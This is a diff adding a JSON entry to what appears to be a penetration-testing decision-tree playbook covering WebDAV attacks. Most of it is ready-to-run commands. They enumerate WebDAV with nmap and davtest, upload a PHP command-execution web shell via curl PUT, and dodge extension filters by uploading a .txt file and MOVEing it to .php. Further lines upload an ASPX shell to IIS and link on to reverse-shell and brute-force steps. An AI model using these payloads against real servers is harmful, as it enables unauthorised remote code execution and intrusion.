@@ -1,0 +1,22 @@
+{
+  "id": "webdav",
+  "phase": "WEB",
+  "title": "WebDAV",
+  "body": "WebDAV over HTTP/HTTPS lets you upload files via PUT. If PUT is enabled and you can write to the webroot, you have a shell. Test methods first.",
+  "cmd": "nmap -p 80,443 --script http-webdav-scan,http-methods $ip\ncurl -X OPTIONS http://$ip/webdav/ -v   # Look for PUT in Allow header\n\ndavtest -url http://$ip/webdav/\ndavtest -url http://$ip/webdav/ -auth user:pass\n\n# Direct PUT upload\ncurl -X PUT http://$ip/webdav/shell.php \\\n  -u user:pass \\\n  -d '<?php system($_GET[\"cmd\"]); ?>'\n\n# Upload as .txt then MOVE to .php (extension bypass)\ncurl -X PUT http://$ip/webdav/shell.txt -u user:pass \\\n  -d '<?php system($_GET[\"cmd\"]); ?>'\ncurl -X MOVE http://$ip/webdav/shell.txt \\\n  -u user:pass -H \"Destination: http://$ip/webdav/shell.php\"\n\n# ASPX for IIS\ncurl -X PUT http://$ip/webdav/shell.aspx -u user:pass \\\n  --data-binary @shell.aspx\n\n# Common paths\n# /webdav/  /dav/  /WebDAV/  /uploads/  /_vti_bin/\n\n# List contents\ncadaver http://$ip/webdav/\n# dav> ls  put shell.php  get file.txt",
+  "warn": "Check if the upload directory is web-accessible — WebDAV root may not be under webroot.",
+  "choices": [
+    {
+      "label": "PUT enabled — uploaded shell",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "MOVE bypass worked — got RCE",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Need creds — try default WebDAV creds",
+      "next": "bruteforce"
+    }
+  ]
+}
